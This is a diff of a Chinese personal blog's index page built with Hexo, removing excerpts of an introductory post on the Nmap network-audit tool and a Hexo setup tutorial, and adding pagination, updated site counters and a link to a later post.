-          <h1 id="Nmap-原理和应用"><a href="#Nmap-原理和应用" class="headerlink" title="Nmap 原理和应用"></a>Nmap 原理和应用</h1><h2 id="1-Nmap-介绍"><a href="#1-Nmap-介绍" class="headerlink" title="1. Nmap 介绍"></a>1. Nmap 介绍</h2><p>nmap是一款开源免费的网络发现和安全审计工具，是目前最流行的安全必备工具之一。<br>一般情况下，Nmap用于列举网络主机清单、管理服务升级调度、监控主机或服务运行状况。Nmap 可以检测目标机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操<br>作系统与设备类型等信息。</p>
-<p>###Nmap的优点###</p>
-<ol>
-<li>灵活。支持数十种不同的扫描方式，支持多种目标对象的扫描。`</li>
-<li>强大。Nmap 可以用于扫描互联网上大规模的计算机。</li>
-<li>可移植。支持主流操作系统：Windows/Linux/Unix/MacOS 等等；源码开放，方便移植。</li>
-<li>简单。提供默认的操作能覆盖大部分功能，基本端口扫描nmap targetip，全面的扫描   nmap –A targetip。</li>
-<li>自由。Nmap 作为开源软件，在GPL License 的范围内可以自由的使用。</li>
-<li>文档丰富。Nmap 官网提供了详细的文档描述。Nmap 作者及其他安全专家编写了多部Nmap<br>参考书籍。</li>
-<li>社区支持。Nmap 背后有强大的社区团队支持。</li>
-<li>赞誉有加。获得很多的奖励，并在很多影视作品中出现（如黑客帝国2、Die Hard4 等）。</li>
-<li>流行。目前Nmap 已经被成千上万的安全专家列为必备的工具之一。</li>
-</ol>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2014/11/23/nmap/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2014/08/22/untitled-1471872474620/" itemprop="url">
-                  使用Hexo搭建个人博客
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2014-08-22T21:27:54+08:00" content="2014-08-22">
-              2014-08-22
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/hexo/" itemprop="url" rel="index">
-                    <span itemprop="name">hexo</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2014/08/22/untitled-1471872474620/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2014/08/22/untitled-1471872474620/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2014/08/22/untitled-1471872474620/" class="leancloud_visitors" data-flag-title="使用Hexo搭建个人博客">
-               &nbsp; | &nbsp;
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               <span class="post-meta-item-text">阅读次数 </span>
-               <span class="leancloud-visitors-count"></span>
-              </span>
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="使用Hexo搭建个人博客"><a href="#使用Hexo搭建个人博客" class="headerlink" title="使用Hexo搭建个人博客"></a>使用Hexo搭建个人博客</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前有用过别的博客写过，不过有的要审核有的界面不喜欢，也没有什么特色，总是提不起兴趣，后来接触了github，感觉到了写博客的动力，就自己搭建了一个个人博客。因为这中间遇到了很多问题，所以特此编写了一个教程，方便初学者使用，少走弯路。</p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>此教程适用于windows，不适用mac和linux，之后有可能会写linux的教程，在此不做确定。</p>
-<h2 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h2><p>下载安装Node.js。安装完之后建议重启下。如果不重启后面使用hexo的时候有可能会遇提示无效的命令。</p>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2014/08/22/untitled-1471872474620/#more" rel="contents">
+            <a class="btn" href="/2016/10/30/代码执行漏洞之站长工具/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1269,6 +2054,10 @@
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
 
 
           </div>
@@ -1307,7 +2096,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">8</span>
+              <span class="site-state-item-count">23</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1315,12 +2104,19 @@
           
             <div class="site-state-item site-state-categories">
               
-                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-count">8</span>
                 <span class="site-state-item-name">分类</span>
               
             </div>
           
 
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
           
 
         </nav>
@@ -1385,7 +2181,7 @@
 <div class="copyright" >
   
   &copy;  2014 - 
-  <span itemprop="copyrightYear">2016</span>
+  <span itemprop="copyrightYear">2017</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
